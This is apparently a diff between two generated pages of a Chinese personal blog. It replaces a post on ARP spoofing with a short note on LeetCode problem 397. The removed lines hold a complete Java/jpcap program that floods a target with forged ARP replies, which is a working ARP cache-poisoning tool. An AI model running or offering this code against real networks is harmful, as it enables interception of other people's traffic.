@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="arp">
+    <meta name="keywords" content="397整数替换, 艾茶叶蛋">
     <meta name="description" content="一个人几乎可以在任何他怀有无限热忱的事情上成功。——查尔斯·史考伯">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>arp欺骗 | 艾茶叶蛋</title>
+    <title>397整数替换 | 艾茶叶蛋</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -243,7 +243,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '0f528e7d2fb41dce71c15e7568a23992f8aa30de1473368f9e2dedec43b8c66c';
+        let pwd = '';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误！');
@@ -256,12 +256,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">arp欺骗</h1>
+                    <h1 class="description center-align post-title">397整数替换</h1>
                 </div>
             </div>
         </div>
@@ -376,25 +376,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E6%8A%80%E8%83%BD/">
-                                <span class="chip bg-color">技能</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E7%BD%91%E7%BB%9C/" class="post-category">
-                                网络
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -403,21 +390,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-14
+                    2021-11-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-25
+                    2021-11-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    269
+                    43
                 </div>
                 
 
@@ -440,60 +427,9 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <pre><code>
-package com.test.arp;
-import java.net.InetAddress;
-import jpcap.JpcapCaptor;
-import jpcap.JpcapSender;
-import jpcap.NetworkInterface;
-import jpcap.packet.ARPPacket;
-import jpcap.packet.EthernetPacket;
+                <p>当 n为偶数时，我们只有唯一的方法将 n 替换为 n/2；</p>
+<p>当 n 为奇数时，n除以 4 的余数要么为 1，要么为 3。</p>
 
-public class SendFakeARP {
-    static byte[] stomac(String s) {
-        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
-        String[] s1 = s.split(&quot;-&quot;);
-        for (int x = 0; x &lt; s1.length; x++) {
-            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) &amp; 0xff);
-        }
-        return mac;
-    }
-    public static void main(String[] args) throws Exception {
-        int time = 2;  // 重发间隔时间
-        InetAddress desip = InetAddress.getByName(&quot;192.168.1.2&quot;);// 被欺骗的目标IP地址
-        byte[] desmac = stomac(&quot;01-1c-23-3c-51-cf&quot;);// 被欺骗的目标目标MAC数组
-        InetAddress srcip = InetAddress.getByName(&quot;192.168.1.3&quot;);// 源IP地址
-        byte[] srcmac = stomac(&quot;00-1C-13-2E-A8-0A&quot;); // 假的MAC数组
-        // 枚举网卡并打开设备
-        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
-        NetworkInterface device = devices[1];
-        JpcapSender sender = JpcapSender.openDevice(device);
-        // 设置ARP包
-        ARPPacket arp = new ARPPacket();
-        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
-        arp.prototype = ARPPacket.PROTOTYPE_IP;
-        arp.operation = ARPPacket.ARP_REPLY;
-        arp.hlen = 6;
-        arp.plen = 4;
-        arp.sender_hardaddr = srcmac;
-        arp.sender_protoaddr = srcip.getAddress();
-        arp.target_hardaddr = desmac;
-        arp.target_protoaddr = desip.getAddress();
-        // 设置DLC帧
-        EthernetPacket ether = new EthernetPacket();
-        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
-        ether.src_mac = srcmac;
-        ether.dst_mac = desmac;
-        arp.datalink = ether;
-        // 发送ARP应答包
-        while (true) {
-            System.out.println(&quot;sending arp..&quot;);
-            sender.sendPacket(arp);
-            Thread.sleep(time * 1000);
-        }
-    }
-}
-</code></pre>
             </div>
             <hr/>
 
@@ -518,7 +454,7 @@ public class SendFakeARP {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://scanele.cn/2020/09/14/arp-qi-pian/">http://scanele.cn/2020/09/14/arp-qi-pian/</a>
+                    <a href="http://scanele.cn/2021/11/20/397-zheng-shu-ti-huan/">http://scanele.cn/2021/11/20/397-zheng-shu-ti-huan/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -555,11 +491,7 @@ public class SendFakeARP {
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E6%8A%80%E8%83%BD/">
-                                    <span class="chip bg-color">技能</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -990,34 +922,44 @@ public class SendFakeARP {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/11/20/397-zheng-shu-ti-huan/">
+                <a href="/2021/12/11/mysql-ji-chu-yu-fa/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="397整数替换">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="mysql基础语法">
                         
-                        <span class="card-title">397整数替换</span>
+                        <span class="card-title">mysql基础语法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            当 n为偶数时，我们只有唯一的方法将 n 替换为 n/2；
-当 n 为奇数时，n除以 4 的余数要么为 1，要么为 3。
-
+                            mysql基础语法知识
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-20
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-11
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            艾茶叶蛋
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-category">
+                                    基础知识
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/mysql/">
+                        <span class="chip bg-color">mysql</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1029,31 +971,31 @@ public class SendFakeARP {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/09/05/spring/">
+                <a href="/2020/09/14/arp-qi-pian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="spring">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="arp欺骗">
                         
-                        <span class="card-title">spring</span>
+                        <span class="card-title">arp欺骗</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            spring学习笔记
+                            arp欺骗
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    笔记
+                            <a href="/categories/%E7%BD%91%E7%BB%9C/" class="post-category">
+                                    网络
                                 </a>
                             
                             
@@ -1063,8 +1005,8 @@ public class SendFakeARP {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%90%8E%E7%AB%AF/">
-                        <span class="chip bg-color">后端</span>
+                    <a href="/tags/%E6%8A%80%E8%83%BD/">
+                        <span class="chip bg-color">技能</span>
                     </a>
                     
                 </div>
